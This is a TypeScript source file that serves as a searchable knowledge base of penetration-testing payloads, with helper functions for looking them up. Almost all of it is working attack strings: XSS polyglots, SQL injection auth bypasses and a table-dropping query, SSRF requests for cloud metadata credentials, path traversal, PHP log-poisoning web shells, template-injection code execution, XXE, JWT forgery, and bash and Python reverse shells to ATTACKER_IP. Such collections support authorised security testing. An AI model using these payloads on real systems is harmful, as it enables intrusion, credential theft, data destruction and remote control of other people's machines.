/**
 * Knowledge base: Pentesting payloads
 * Organized by vulnerability class and context
 */

export interface Payload {
  id: string;
  vulnClass: string;
  context: string;
  payload: string;
  description: string;
  target?: string[];
  tags: string[];
}

export const payloads: Payload[] = [
  // ========== XSS ==========
  {
    id: 'xss-basic-script',
    vulnClass: 'xss',
    context: 'html',
    payload: '<script>alert(1)</script>',
    description: 'Basic reflected XSS in HTML body',
    target: ['html-body'],
    tags: ['xss', 'reflected', 'basic'],
  },
  {
    id: 'xss-img-onerror',
    vulnClass: 'xss',
    context: 'html-attribute',
    payload: '"><img src=x onerror=alert(1)>',
    description: 'XSS breaking out of attribute',
    tags: ['xss', 'attribute-break', 'img'],
  },
  {
    id: 'xss-svg',
    vulnClass: 'xss',
    context: 'html',
    payload: '<svg onload=alert(1)>',
    description: 'SVG with onload event handler',
    tags: ['xss', 'svg', 'event-handler'],
  },
  {
    id: 'xss-javascript-url',
    vulnClass: 'xss',
    context: 'href',
    payload: 'javascript:alert(1)',
    description: 'JavaScript protocol in href/src',
    tags: ['xss', 'javascript-uri'],
  },
  {
    id: 'xss-data-url',
    vulnClass: 'xss',
    context: 'href',
    payload: 'data:text/html,<script>alert(1)</script>',
    description: 'Data URL XSS',
    tags: ['xss', 'data-uri'],
  },
  {
    id: 'xss-polyglot',
    vulnClass: 'xss',
    context: 'multiple',
    payload: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
    description: 'Universal XSS polyglot that works in many contexts',
    tags: ['xss', 'polyglot', 'waf-bypass'],
  },
  {
    id: 'xss-mutated',
    vulnClass: 'xss',
    context: 'html',
    payload: '<a id="x" href="javascript:alert(1)"><h1 id=x><a href="#x">click',
    description: 'Mutation XSS (mXSS) - works in DOMPurify <2.0.17',
    tags: ['xss', 'mxss', 'mutation'],
  },
  {
    id: 'xss-event-no-quotes',
    vulnClass: 'xss',
    context: 'attribute-no-quotes',
    payload: 'onmouseover=alert(1)%20',
    description: 'XSS in unquoted attribute (needs space or > before)',
    tags: ['xss', 'unquoted'],
  },
  {
    id: 'xss-angular-template',
    vulnClass: 'xss',
    context: 'angular',
    payload: '{{constructor.constructor(\'alert(1)\')()}}',
    description: 'AngularJS template injection / sandbox escape',
    tags: ['xss', 'angular', 'ssti', 'sandbox-escape'],
  },

  // ========== SQLi ==========
  {
    id: 'sqli-auth-bypass-mysql',
    vulnClass: 'sqli',
    context: 'login',
    payload: "admin' OR '1'='1'-- -",
    description: 'Classic MySQL auth bypass',
    target: ['mysql', 'login'],
    tags: ['sqli', 'auth-bypass', 'mysql'],
  },
  {
    id: 'sqli-union-mysql',
    vulnClass: 'sqli',
    context: 'select',
    payload: "' UNION SELECT 1,2,3-- -",
    description: 'Union-based SQLi - enumerate column count first with ORDER BY',
    target: ['mysql'],
    tags: ['sqli', 'union', 'mysql'],
  },
  {
    id: 'sqli-union-mssql',
    vulnClass: 'sqli',
    context: 'select',
    payload: "' UNION SELECT 1,2,3--",
    description: 'Union-based SQLi on MSSQL',
    target: ['mssql'],
    tags: ['sqli', 'union', 'mssql'],
  },
  {
    id: 'sqli-time-mysql',
    vulnClass: 'sqli',
    context: 'blind',
    payload: "' AND SLEEP(5)-- -",
    description: 'Time-based blind SQLi (MySQL)',
    target: ['mysql'],
    tags: ['sqli', 'blind', 'time-based', 'mysql'],
  },
  {
    id: 'sqli-time-postgres',
    vulnClass: 'sqli',
    context: 'blind',
    payload: "'; SELECT pg_sleep(5)--",
    description: 'Time-based blind SQLi (PostgreSQL)',
    target: ['postgresql'],
    tags: ['sqli', 'blind', 'time-based', 'postgresql'],
  },
  {
    id: 'sqli-time-mssql',
    vulnClass: 'sqli',
    context: 'blind',
    payload: "'; WAITFOR DELAY '0:0:5'--",
    description: 'Time-based blind SQLi (MSSQL)',
    target: ['mssql'],
    tags: ['sqli', 'blind', 'time-based', 'mssql'],
  },
  {
    id: 'sqli-stacked',
    vulnClass: 'sqli',
    context: 'stacked',
    payload: "'; DROP TABLE users--",
    description: 'Stacked queries (PostgreSQL, MSSQL) - drops users table',
    tags: ['sqli', 'stacked', 'destructive'],
  },
  {
    id: 'sqli-versions-mysql',
    vulnClass: 'sqli',
    context: 'recon',
    payload: "' UNION SELECT @@version,2,3-- -",
    description: 'Get MySQL version via UNION',
    target: ['mysql'],
    tags: ['sqli', 'recon', 'fingerprint'],
  },
  {
    id: 'sqli-extract-tables-mysql',
    vulnClass: 'sqli',
    context: 'extraction',
    payload: "' UNION SELECT GROUP_CONCAT(table_name),2,3 FROM information_schema.tables WHERE table_schema=database()-- -",
    description: 'Extract table names from current DB (MySQL)',
    target: ['mysql'],
    tags: ['sqli', 'extraction', 'information-schema'],
  },

  // ========== SSRF ==========
  {
    id: 'ssrf-aws-imds',
    vulnClass: 'ssrf',
    context: 'aws-metadata',
    payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    description: 'AWS instance metadata - IAM role credentials',
    target: ['aws'],
    tags: ['ssrf', 'aws', 'cloud', 'iam'],
  },
  {
    id: 'ssrf-aws-imdsv2',
    vulnClass: 'ssrf',
    context: 'aws-metadata',
    payload: 'PUT /latest/api/token HTTP/1.1\\nHost: 169.254.169.254\\nX-aws-ec2-metadata-token-ttl-seconds: 21600',
    description: 'IMDSv2 - First get token, then access metadata',
    target: ['aws'],
    tags: ['ssrf', 'aws', 'imdsv2'],
  },
  {
    id: 'ssrf-gcp',
    vulnClass: 'ssrf',
    context: 'gcp-metadata',
    payload: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
    description: 'GCP metadata - need header Metadata-Flavor: Google',
    target: ['gcp'],
    tags: ['ssrf', 'gcp', 'cloud'],
  },
  {
    id: 'ssrf-azure',
    vulnClass: 'ssrf',
    context: 'azure-metadata',
    payload: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    description: 'Azure metadata - need header Metadata: true',
    target: ['azure'],
    tags: ['ssrf', 'azure', 'cloud'],
  },
  {
    id: 'ssrf-localhost-decimal',
    vulnClass: 'ssrf',
    context: 'bypass',
    payload: 'http://2130706433/',
    description: 'Bypass filters using decimal IP for 127.0.0.1',
    tags: ['ssrf', 'bypass', 'decimal-ip'],
  },
  {
    id: 'ssrf-localhost-hex',
    vulnClass: 'ssrf',
    context: 'bypass',
    payload: 'http://0x7f000001/',
    description: 'Bypass using hex IP for 127.0.0.1',
    tags: ['ssrf', 'bypass', 'hex-ip'],
  },
  {
    id: 'ssrf-bypass-redirect',
    vulnClass: 'ssrf',
    context: 'bypass',
    payload: 'http://attacker.com/redirect-to-169.254.169.254',
    description: 'Use external redirect to bypass URL validators',
    tags: ['ssrf', 'bypass', 'redirect'],
  },
  {
    id: 'ssrf-bypass-at',
    vulnClass: 'ssrf',
    context: 'bypass',
    payload: 'http://expected-host@169.254.169.254/',
    description: 'Use @ in URL to confuse validators (userinfo)',
    tags: ['ssrf', 'bypass', 'userinfo'],
  },
  {
    id: 'ssrf-bypass-cidr',
    vulnClass: 'ssrf',
    context: 'bypass',
    payload: 'http://0177.0.0.1/',
    description: 'Octal IP representation bypass',
    tags: ['ssrf', 'bypass', 'octal-ip'],
  },
  {
    id: 'ssrf-file-protocol',
    vulnClass: 'ssrf',
    context: 'protocol',
    payload: 'file:///etc/passwd',
    description: 'File protocol - reads local files',
    tags: ['ssrf', 'file-protocol', 'lfi'],
  },
  {
    id: 'ssrf-gopher',
    vulnClass: 'ssrf',
    context: 'protocol',
    payload: 'gopher://127.0.0.1:6379/_FLUSHALL',
    description: 'Gopher protocol - send raw TCP (e.g., to internal Redis)',
    tags: ['ssrf', 'gopher', 'redis', 'rce'],
  },

  // ========== LFI / Path Traversal ==========
  {
    id: 'lfi-basic',
    vulnClass: 'lfi',
    context: 'path',
    payload: '../../../../etc/passwd',
    description: 'Basic path traversal to /etc/passwd',
    tags: ['lfi', 'path-traversal', 'linux'],
  },
  {
    id: 'lfi-windows',
    vulnClass: 'lfi',
    context: 'path',
    payload: '..\\..\\..\\..\\windows\\win.ini',
    description: 'Windows path traversal',
    tags: ['lfi', 'path-traversal', 'windows'],
  },
  {
    id: 'lfi-php-filter',
    vulnClass: 'lfi',
    context: 'php',
    payload: 'php://filter/convert.base64-encode/resource=index.php',
    description: 'PHP filter wrapper to read source code',
    target: ['php'],
    tags: ['lfi', 'php', 'filter', 'source-disclosure'],
  },
  {
    id: 'lfi-php-input',
    vulnClass: 'lfi',
    context: 'php',
    payload: 'php://input',
    description: 'PHP input wrapper - inject code via POST body',
    target: ['php'],
    tags: ['lfi', 'php', 'rce'],
  },
  {
    id: 'lfi-proc-self',
    vulnClass: 'lfi',
    context: 'linux',
    payload: '/proc/self/environ',
    description: 'Read process env vars (may contain secrets)',
    tags: ['lfi', 'linux', 'env', 'secrets'],
  },
  {
    id: 'lfi-log-poison',
    vulnClass: 'lfi',
    context: 'rce',
    payload: '<?php system($_GET["c"]); ?>',
    description: 'Inject PHP into access log, then include the log',
    tags: ['lfi', 'log-poisoning', 'rce', 'php'],
  },

  // ========== Command Injection ==========
  {
    id: 'cmdi-semicolon',
    vulnClass: 'cmdi',
    context: 'unix',
    payload: '; id',
    description: 'Command separator semicolon (Unix)',
    tags: ['cmdi', 'unix', 'separator'],
  },
  {
    id: 'cmdi-pipe',
    vulnClass: 'cmdi',
    context: 'unix',
    payload: '| id',
    description: 'Pipe command (Unix)',
    tags: ['cmdi', 'unix', 'pipe'],
  },
  {
    id: 'cmdi-and',
    vulnClass: 'cmdi',
    context: 'unix',
    payload: '&& id',
    description: 'Logical AND (Unix)',
    tags: ['cmdi', 'unix', 'logical-and'],
  },
  {
    id: 'cmdi-subshell',
    vulnClass: 'cmdi',
    context: 'unix',
    payload: '$(id)',
    description: 'Command substitution $()',
    tags: ['cmdi', 'unix', 'subshell'],
  },
  {
    id: 'cmdi-backtick',
    vulnClass: 'cmdi',
    context: 'unix',
    payload: '`id`',
    description: 'Backtick command substitution',
    tags: ['cmdi', 'unix', 'backtick'],
  },
  {
    id: 'cmdi-windows',
    vulnClass: 'cmdi',
    context: 'windows',
    payload: '| whoami',
    description: 'Windows command injection',
    tags: ['cmdi', 'windows'],
  },
  {
    id: 'cmdi-time',
    vulnClass: 'cmdi',
    context: 'blind',
    payload: '; sleep 5',
    description: 'Time-based detection (Unix)',
    tags: ['cmdi', 'blind', 'time-based'],
  },
  {
    id: 'cmdi-reverse-shell-bash',
    vulnClass: 'cmdi',
    context: 'reverse-shell',
    payload: 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1',
    description: 'Bash reverse shell (Linux)',
    tags: ['cmdi', 'reverse-shell', 'bash'],
  },
  {
    id: 'cmdi-reverse-shell-python',
    vulnClass: 'cmdi',
    context: 'reverse-shell',
    payload: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
    description: 'Python reverse shell',
    tags: ['cmdi', 'reverse-shell', 'python'],
  },

  // ========== SSTI ==========
  {
    id: 'ssti-jinja2-math',
    vulnClass: 'ssti',
    context: 'jinja2',
    payload: '{{7*7}}',
    description: 'Detect Jinja2/Flask SSTI (math test)',
    target: ['python', 'jinja2', 'flask'],
    tags: ['ssti', 'jinja2', 'flask', 'detection'],
  },
  {
    id: 'ssti-jinja2-rce',
    vulnClass: 'ssti',
    context: 'jinja2',
    payload: "{{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}",
    description: 'Jinja2 RCE via subclass traversal (X is index of Popen)',
    target: ['python', 'jinja2'],
    tags: ['ssti', 'jinja2', 'rce'],
  },
  {
    id: 'ssti-twig-math',
    vulnClass: 'ssti',
    context: 'twig',
    payload: '{{7*7}}',
    description: 'Detect Twig (PHP) SSTI',
    target: ['php', 'twig'],
    tags: ['ssti', 'twig', 'php', 'detection'],
  },
  {
    id: 'ssti-twig-rce',
    vulnClass: 'ssti',
    context: 'twig',
    payload: "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
    description: 'Twig RCE',
    target: ['php', 'twig'],
    tags: ['ssti', 'twig', 'rce'],
  },
  {
    id: 'ssti-freemarker-rce',
    vulnClass: 'ssti',
    context: 'freemarker',
    payload: '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}',
    description: 'FreeMarker RCE',
    target: ['java', 'freemarker'],
    tags: ['ssti', 'freemarker', 'rce', 'java'],
  },
  {
    id: 'ssti-erb-rce',
    vulnClass: 'ssti',
    context: 'erb',
    payload: '<%= system("id") %>',
    description: 'ERB (Ruby) RCE',
    target: ['ruby', 'erb'],
    tags: ['ssti', 'erb', 'ruby', 'rce'],
  },
  {
    id: 'ssti-velocity-rce',
    vulnClass: 'ssti',
    context: 'velocity',
    payload: '#set($x=##this.class.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null))$x.exec("id")',
    description: 'Apache Velocity RCE',
    target: ['java', 'velocity'],
    tags: ['ssti', 'velocity', 'rce', 'java'],
  },

  // ========== XXE ==========
  {
    id: 'xxe-basic',
    vulnClass: 'xxe',
    context: 'file-read',
    payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><name>&xxe;</name></root>`,
    description: 'Classic XXE to read /etc/passwd',
    tags: ['xxe', 'file-read', 'linux'],
  },
  {
    id: 'xxe-php-filter',
    vulnClass: 'xxe',
    context: 'file-read',
    payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root><name>&xxe;</name></root>`,
    description: 'PHP XXE with base64 filter',
    target: ['php'],
    tags: ['xxe', 'php', 'base64'],
  },
  {
    id: 'xxe-ssrf',
    vulnClass: 'xxe',
    context: 'ssrf',
    payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-service/admin">
]>
<root><name>&xxe;</name></root>`,
    description: 'XXE for SSRF against internal services',
    tags: ['xxe', 'ssrf'],
  },
  {
    id: 'xxe-expect',
    vulnClass: 'xxe',
    context: 'rce',
    payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>`,
    description: 'XXE RCE via expect:// (PHP)',
    target: ['php'],
    tags: ['xxe', 'rce', 'php', 'expect'],
  },

  // ========== Open Redirect ==========
  {
    id: 'redirect-protocol-relative',
    vulnClass: 'redirect',
    context: 'bypass',
    payload: '//evil.com',
    description: 'Protocol-relative URL bypass',
    tags: ['redirect', 'bypass', 'open-redirect'],
  },
  {
    id: 'redirect-backslash',
    vulnClass: 'redirect',
    context: 'bypass',
    payload: '/\\evil.com',
    description: 'Backslash bypass for some validators',
    tags: ['redirect', 'bypass', 'open-redirect'],
  },
  {
    id: 'redirect-js',
    vulnClass: 'redirect',
    context: 'javascript',
    payload: 'javascript:alert(document.domain)//',
    description: 'JavaScript URI redirect',
    tags: ['redirect', 'xss', 'open-redirect'],
  },
  {
    id: 'redirect-data',
    vulnClass: 'redirect',
    context: 'data',
    payload: 'data:text/html,<script>location="https://evil.com"</script>',
    description: 'Data URI redirect',
    tags: ['redirect', 'data-uri', 'open-redirect'],
  },

  // ========== JWT ==========
  {
    id: 'jwt-none-alg',
    vulnClass: 'jwt',
    context: 'bypass',
    payload: '{"alg":"none","typ":"JWT"}.{"sub":"admin","role":"admin"}.',
    description: 'JWT with alg: none and empty signature',
    tags: ['jwt', 'bypass', 'auth-bypass', 'none-algorithm'],
  },
  {
    id: 'jwt-alg-confusion',
    vulnClass: 'jwt',
    context: 'bypass',
    payload: '{"alg":"HS256","typ":"JWT"}.{"sub":"admin","role":"admin"}.<RS256_public_key_as_HS256_secret>',
    description: 'Algorithm confusion: sign HS256 using RS256 public key as secret',
    tags: ['jwt', 'bypass', 'algorithm-confusion'],
  },

  // ========== File Upload Bypass ==========
  {
    id: 'upload-double-ext',
    vulnClass: 'file-upload',
    context: 'bypass',
    payload: 'shell.php.jpg',
    description: 'Double extension (Apache mod_mime misconfig)',
    target: ['apache'],
    tags: ['file-upload', 'bypass', 'apache'],
  },
  {
    id: 'upload-null-byte',
    vulnClass: 'file-upload',
    context: 'bypass',
    payload: 'shell.php%00.jpg',
    description: 'Null byte truncation (old PHP, IIS)',
    tags: ['file-upload', 'bypass', 'null-byte'],
  },
  {
    id: 'upload-htaccess',
    vulnClass: 'file-upload',
    context: 'rce',
    payload: 'AddType application/x-httpd-php .jpg',
    description: 'Upload .htaccess to execute .jpg as PHP (Apache)',
    target: ['apache'],
    tags: ['file-upload', 'htaccess', 'rce', 'apache'],
  },
  {
    id: 'upload-svg',
    vulnClass: 'file-upload',
    context: 'xss',
    payload: '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
    description: 'SVG with embedded XSS',
    tags: ['file-upload', 'svg', 'xss'],
  },

  // ========== Prototype Pollution ==========
  {
    id: 'pp-basic',
    vulnClass: 'prototype-pollution',
    context: 'json',
    payload: '{"__proto__":{"isAdmin":true}}',
    description: 'Basic prototype pollution via __proto__',
    tags: ['prototype-pollution', 'json'],
  },
  {
    id: 'pp-constructor',
    vulnClass: 'prototype-pollution',
    context: 'json',
    payload: '{"constructor":{"prototype":{"isAdmin":true}}}',
    description: 'Prototype pollution via constructor.prototype',
    tags: ['prototype-pollution', 'json'],
  },
];

export function searchPayloads(query: string, vulnClass?: string): Payload[] {
  const q = query.toLowerCase();
  return payloads.filter(p => {
    if (vulnClass && p.vulnClass !== vulnClass) return false;
    return (
      p.vulnClass.toLowerCase().includes(q) ||
      p.context.toLowerCase().includes(q) ||
      p.description.toLowerCase().includes(q) ||
      p.payload.toLowerCase().includes(q) ||
      p.tags.some(t => t.toLowerCase().includes(q)) ||
      (p.target && p.target.some(t => t.toLowerCase().includes(q)))
    );
  });
}

export function getPayloadsByClass(vulnClass: string): Payload[] {
  return payloads.filter(p => p.vulnClass === vulnClass);
}

export function getPayloadById(id: string): Payload | undefined {
  return payloads.find(p => p.id === id);
}
